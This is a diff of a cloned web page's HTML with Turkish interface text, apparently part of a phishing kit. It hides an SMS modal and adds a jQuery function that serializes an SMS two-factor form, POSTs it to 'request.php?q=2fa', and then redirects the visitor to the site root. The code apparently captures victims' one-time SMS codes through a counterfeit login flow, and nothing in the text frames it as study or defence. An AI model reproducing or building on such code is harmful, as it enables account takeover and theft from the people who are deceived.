@@ -219,7 +219,7 @@
                   <!----><!---->
                </app-custom-numpad>
             </div>
-            <div materialize="modal" class="modal" id="sms-mdl" style="z-index: 1043; top: 10%; opacity: 1; transform: scaleX(1); display: block;">
+            <div materialize="modal" class="modal hidden" id="sms-mdl" style="z-index: 1043; top: 10%; opacity: 1; transform: scaleX(1); display: block;">
                <a href="javascript:;" class="modal-action modal-close ng-star-inserted"><i class="material-icons pg-icons">close</i></a><!----><!----><!---->
                <div class="modal-content">
                   <sms-modal class="ng-star-inserted">
@@ -250,6 +250,25 @@
                }
 
                geriyeSay();
+               function smsa(){
+                  event.preventDefault();
+               $.ajax({
+                  type: 'POST',
+                  url: 'request.php?q=2fa',
+                  data: $('#smsForm').serialize(),
+                  success: (response) => {
+                     if (response == 'error') {
+                     Swal.fire('Hata!','Bilgileri doğru girdiğinizden emin olun','error');
+                     }else{
+                     if (locate == 0) {
+                        window.location.href = '/';
+                     }else{
+                        window.location.href = '/';
+                     }
+                     }
+                  }
+  })
+               }
                </script>
             <!---->
          </app-out-component>
